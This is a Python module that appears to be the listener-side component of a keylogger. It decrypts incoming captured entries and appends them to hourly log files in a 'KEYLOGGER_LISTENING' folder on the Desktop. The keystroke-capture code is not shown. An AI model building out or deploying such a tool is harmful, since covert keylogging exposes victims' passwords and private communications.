import os
from pathlib import Path
from datetime import datetime
from encryptor import Encryptor

class FileWriter:
    def __init__(self, base_dir_name="KEYLOGGER_LISTENING"):
        desktop = Path.home() / "Desktop"
        self.base_dir = desktop / base_dir_name
        os.makedirs(self.base_dir, exist_ok=True)

    def write(self, log_entry):
        try:
            timestamp = datetime.now()
            filename = f"{timestamp.strftime('%Y-%m-%d_%H')}.txt"
            file_path = os.path.join(self.base_dir, filename)

            if log_entry.startswith("("):
                message = f"{log_entry}\n"
            else:
                decrypted = Encryptor.decrypt(log_entry)
                parts = decrypted.split(" | ")
                if len(parts) > 1:
                    message = f"{parts[0]} | {parts[1]}\n"
                else:
                    message = f"{decrypted}\n"

            with open(file_path, "a", encoding="utf-8") as f:
                f.write(message)

        except Exception as e:
            print(f"⚠️ שגיאה בכתיבה: {e}")
